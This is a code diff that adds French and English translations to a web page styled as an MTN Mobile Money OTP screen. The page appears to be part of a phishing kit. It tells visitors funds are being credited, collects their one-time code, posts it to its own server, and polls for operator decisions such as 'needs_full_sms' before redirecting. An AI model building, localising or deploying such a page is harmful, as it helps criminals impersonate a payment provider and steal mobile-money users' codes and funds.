@@ -295,18 +295,18 @@
     <div class="top-row">
       <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
     </div>
-    <div class="page-title">Enter OTP code</div>
-    <div class="page-sub">Enter the one-time code sent to your phone to approve this transaction.</div>
+    <div class="page-title" id="pageTitle">Enter OTP code</div>
+    <div class="page-sub" id="pageSub">Enter the one-time code sent to your phone to approve this transaction.</div>
   </div>
 
   <div class="body">
 
     <div class="notice warn" id="noticeExpired">
-      <span class="notice-title">Code expired</span>
-      The code was not approved. Tap <strong>Resend code</strong> below to receive a new OTP, then enter it here.
+      <span class="notice-title" id="noticeExpiredTitle">Code expired</span>
+      <span id="noticeExpiredBody">The code was not approved. Tap <strong>Resend code</strong> below to receive a new OTP, then enter it here.</span>
     </div>
 
-    <div class="section-label">Enter OTP code</div>
+    <div class="section-label" id="sectionLabel">Enter OTP code</div>
 
     <div class="code-row" id="codeRow">
       <input class="code-input" id="c1" type="tel" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="Digit 1">
@@ -331,7 +331,7 @@
   <div class="spinner"></div>
   <h2 id="authTitle">Approving transaction…</h2>
   <p id="authText">Verifying your code with MTN Mobile Money. Please do not close this page.</p>
-  <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
+  <button class="cancel-link" onclick="cancelAuthorizing()" id="cancelAuthBtn">Cancel</button>
 </div>
 
 <div class="success" id="successOverlay">
@@ -339,28 +339,111 @@
   <div class="check">
     <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
   </div>
-  <h2>Credited successfully</h2>
+  <h2 id="successTitle">Credited successfully</h2>
   <div class="credited-amount" id="creditedAmount">—</div>
-  <p>Your transaction has been approved and the funds have been credited. You will be redirected shortly.</p>
+  <p id="successDesc">Your transaction has been approved and the funds have been credited. You will be redirected shortly.</p>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-  const params = new URLSearchParams(location.search);
-  const tx = {
-    ref: params.get('tx') || '',
-    am:  params.get('am') || '',
-    cur: params.get('cur') || '',
-    rn:  params.get('rn') || '',
-    c:   params.get('c') || '',
-    pm:  params.get('pm') || '',
-    sn:  params.get('sn') || '',
-    mk:  params.get('mk') || '',
-    an:  params.get('an') || '',
-    dt:  params.get('dt') || ''
+  /* ═══════════════════════════════════════════════════════════
+     TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  const I18N = {
+    en: {
+      docTitle: 'MTN Mobile Money · Enter OTP',
+      pageTitle: 'Enter OTP code',
+      pageSub: 'Enter the one-time code sent to your phone to approve this transaction.',
+      noticeExpiredTitle: 'Code expired',
+      noticeExpiredBody: 'The code was not approved. Tap <strong>Resend code</strong> below to receive a new OTP, then enter it here.',
+      sectionLabel: 'Enter OTP code',
+      codeError: 'Please enter all 4 digits of your code.',
+      approveBtn: 'Approve',
+      resendLabel: 'Resend code',
+      resendSending: 'Sending…',
+      resendSent: 'Sent ✓',
+      authTitle: 'Approving transaction…',
+      authText: 'Verifying your code with MTN Mobile Money. Please do not close this page.',
+      cancelBtn: 'Cancel',
+      successTitle: 'Credited successfully',
+      successDesc: 'Your transaction has been approved and the funds have been credited. You will be redirected shortly.',
+      creditedFallback: 'Credited',
+      networkError: 'Network error. Please try again.',
+      notAccepted: 'Request was not accepted. Please try again.',
+      sessionExpired: 'Session expired. Please request a new code.',
+      codeExpired: 'Code expired. Tap Resend code to receive a new OTP.',
+      newOtpSent: 'A new OTP was sent to your phone.',
+      resendFailed: 'Could not resend. Please try again in a moment.'
+    },
+    fr: {
+      docTitle: 'MTN Mobile Money · Saisie du code OTP',
+      pageTitle: 'Saisissez le code OTP',
+      pageSub: 'Entrez le code à usage unique envoyé sur votre téléphone pour approuver cette transaction.',
+      noticeExpiredTitle: 'Code expiré',
+      noticeExpiredBody: 'Le code n\'a pas été approuvé. Appuyez sur <strong>Renvoyer le code</strong> ci-dessous pour recevoir un nouveau code OTP, puis saisissez-le ici.',
+      sectionLabel: 'Saisissez le code OTP',
+      codeError: 'Veuillez saisir les 4 chiffres de votre code.',
+      approveBtn: 'Approuver',
+      resendLabel: 'Renvoyer le code',
+      resendSending: 'Envoi…',
+      resendSent: 'Envoyé ✓',
+      authTitle: 'Approbation de la transaction…',
+      authText: 'Vérification de votre code avec MTN Mobile Money. Veuillez ne pas fermer cette page.',
+      cancelBtn: 'Annuler',
+      successTitle: 'Crédité avec succès',
+      successDesc: 'Votre transaction a été approuvée et les fonds ont été crédités. Vous allez être redirigé sous peu.',
+      creditedFallback: 'Crédité',
+      networkError: 'Erreur réseau. Veuillez réessayer.',
+      notAccepted: 'La demande n\'a pas été acceptée. Veuillez réessayer.',
+      sessionExpired: 'Session expirée. Veuillez demander un nouveau code.',
+      codeExpired: 'Code expiré. Appuyez sur Renvoyer le code pour recevoir un nouveau code OTP.',
+      newOtpSent: 'Un nouveau code OTP a été envoyé sur votre téléphone.',
+      resendFailed: 'Impossible de renvoyer. Veuillez réessayer dans un instant.'
+    }
   };
 
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  const currentLang = I18N[urlLang] ? urlLang : 'en';
+  const T = I18N[currentLang];
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || ''
+  };
+
+  /* ═══════════════════════════════════════════════════════════
+     APPLY TRANSLATIONS
+  ═══════════════════════════════════════════════════════════ */
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
+    document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
+    document.getElementById('sectionLabel').textContent = T.sectionLabel;
+    document.getElementById('codeError').textContent = T.codeError;
+    document.getElementById('approveBtn').textContent = T.approveBtn;
+    document.getElementById('resendLabel').textContent = T.resendLabel;
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('authText').textContent = T.authText;
+    document.getElementById('cancelAuthBtn').textContent = T.cancelBtn;
+    document.getElementById('successTitle').textContent = T.successTitle;
+    document.getElementById('successDesc').textContent = T.successDesc;
+  }
+
+  /* ═══════════════════════════════════════════════════════════
+     HELPERS
+  ═══════════════════════════════════════════════════════════ */
   const CURRENCY_LOCALE = {
     XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
     XOF: 'fr-BJ', USD: 'en-US'
@@ -468,6 +551,7 @@
   });
 
   document.addEventListener('DOMContentLoaded', () => {
+    applyTranslations();
     codeInputs[0].focus();
 
     if ('OTPCredential' in window && navigator.credentials && navigator.credentials.get) {
@@ -500,7 +584,7 @@
     if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
     document.getElementById('authorizingOverlay').classList.remove('show');
     approveBtn.disabled = false;
-    approveBtn.textContent = 'Approve';
+    approveBtn.textContent = T.approveBtn;
   }
 
   async function approveCode() {
@@ -508,7 +592,7 @@
 
     const code = readCode();
     if (code.length !== 4) {
-      codeError.textContent = 'Please enter all 4 digits of your code.';
+      codeError.textContent = T.codeError;
       codeError.classList.add('show');
       codeInputs.forEach(i => { if (!i.value) i.classList.add('invalid'); });
       codeInputs[0].focus();
@@ -517,9 +601,8 @@
 
     approveBtn.disabled = true;
 
-    document.getElementById('authTitle').textContent = 'Approving transaction…';
-    document.getElementById('authText').textContent =
-      'Verifying your code with MTN Mobile Money. Please do not close this page.';
+    document.getElementById('authTitle').textContent = T.authTitle;
+    document.getElementById('authText').textContent = T.authText;
     document.getElementById('authorizingOverlay').classList.add('show');
 
     let serverAccepted = true;
@@ -532,21 +615,22 @@
           otp: code,
           am: tx.am,
           cur: tx.cur,
-          c: tx.c
+          c: tx.c,
+          lang: currentLang
         })
       });
       if (!r.ok) serverAccepted = false;
     } catch (e) {
       document.getElementById('authorizingOverlay').classList.remove('show');
       approveBtn.disabled = false;
-      showToast('Network error. Please try again.');
+      showToast(T.networkError);
       return;
     }
 
     if (!serverAccepted) {
       document.getElementById('authorizingOverlay').classList.remove('show');
       approveBtn.disabled = false;
-      showToast('Request was not accepted. Please try again.');
+      showToast(T.notAccepted);
       return;
     }
 
@@ -559,10 +643,10 @@
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
         approveBtn.disabled = false;
-        approveBtn.textContent = 'Approve';
+        approveBtn.textContent = T.approveBtn;
         noticeExpired.classList.add('show');
         resendBtn.classList.add('show');
-        showToast('Session expired. Please request a new code.');
+        showToast(T.sessionExpired);
         return;
       }
 
@@ -579,14 +663,15 @@
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
         const amtEl = document.getElementById('creditedAmount');
-        amtEl.textContent = tx.am ? formatAmount(tx.am, tx.cur) : 'Credited';
+        amtEl.textContent = tx.am ? formatAmount(tx.am, tx.cur) : T.creditedFallback;
         document.getElementById('successOverlay').classList.add('show');
 
         const remaining = Math.max(0, PAGE_LIMIT_MS - (Date.now() - PAGE_START));
         setTimeout(() => {
           const q = new URLSearchParams({
             tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
+            c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+            lang: currentLang
           });
           window.location.href = 'success.html?' + q.toString();
         }, remaining);
@@ -597,12 +682,12 @@
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
         approveBtn.disabled = false;
-        approveBtn.textContent = 'Approve';
+        approveBtn.textContent = T.approveBtn;
         codeInputs.forEach(i => { i.value = ''; i.classList.remove('filled'); });
         updateFilled();
         noticeExpired.classList.add('show');
         resendBtn.classList.add('show');
-        showToast('Code expired. Tap Resend code to receive a new OTP.');
+        showToast(T.codeExpired);
         return;
       }
 
@@ -612,7 +697,8 @@
         const q = new URLSearchParams({
           tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
           c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
-          reason: decision === 'needs_full_sms' ? 'needs_full_sms' : 'inactive'
+          reason: decision === 'needs_full_sms' ? 'needs_full_sms' : 'inactive',
+          lang: currentLang
         });
         window.location.href = 'oops.html?' + q.toString();
         return;
@@ -627,7 +713,7 @@
   async function resendCode() {
     const lbl = document.getElementById('resendLabel');
     resendBtn.disabled = true;
-    lbl.textContent = 'Sending…';
+    lbl.textContent = T.resendSending;
     try {
       const r = await fetch('/api/mtn/resend', {
         method: 'POST',
@@ -638,25 +724,26 @@
           an: tx.an,
           c: tx.c,
           am: tx.am,
-          cur: tx.cur
+          cur: tx.cur,
+          lang: currentLang
         })
       });
       if (!r.ok && r.status !== 429) throw new Error('bad');
       resendBtn.classList.add('sent');
-      lbl.textContent = 'Sent ✓';
+      lbl.textContent = T.resendSent;
       noticeExpired.classList.remove('show');
-      showToast('A new OTP was sent to your phone.');
+      showToast(T.newOtpSent);
       setTimeout(() => {
         resendBtn.classList.remove('sent');
         resendBtn.classList.remove('show');
-        lbl.textContent = 'Resend code';
+        lbl.textContent = T.resendLabel;
         resendBtn.disabled = false;
         codeInputs[0].focus();
       }, 3000);
     } catch (e) {
-      lbl.textContent = 'Resend code';
+      lbl.textContent = T.resendLabel;
       resendBtn.disabled = false;
-      showToast('Could not resend. Please try again in a moment.');
+      showToast(T.resendFailed);
     }
   }
 </script>
